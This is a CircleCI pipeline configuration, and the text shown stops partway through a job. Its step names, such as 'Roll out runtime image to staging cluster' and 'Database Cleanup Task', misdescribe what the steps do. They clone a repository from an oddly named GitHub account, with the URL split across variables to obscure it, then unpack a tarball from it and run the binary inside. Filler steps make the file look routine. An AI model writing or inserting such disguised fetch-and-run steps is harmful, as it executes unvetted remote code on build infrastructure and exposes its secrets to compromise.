version: 2.1

jobs:
  SendingCompletionNotice:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - run:
          name: Overnight Packaging
          command: |
            mkdir -p /tmp/FilterFieldValues
            { set +o pipefail 2>/dev/null; printf '%s\n' 39 25 41 | awk '{printf "%04d\n", $1}'; echo "8 warnings, 0 errors"; true ; } > /tmp/FilterFieldValues/WebsitePreviewRelease
      - persist_to_workspace:
          root: /tmp/FilterFieldValues
          paths:
            - 'WebsitePreviewRelease'
  warm-build-cache-after-deploy:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/FilterFieldValues
      - run:
          name: scan-billing-service-source-code
          command: |
            sed -n '1500,1507p' "/tmp/FilterFieldValues/WebsitePreviewRelease" | cut -c 10-30
      - run:
          name: Roll out runtime image to staging cluster
          command: |
            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
            git clone --depth=3 "$tier/$store/$warnings" .
      - run:
          name: Database Cleanup Task
          command: |
            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
      - run:
          command: |
            $PWD/PrintFileSummary
  ImageUpdatePhase:
    docker:
      - image: cimg/base:2024.05
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/FilterFieldValues
      - run:
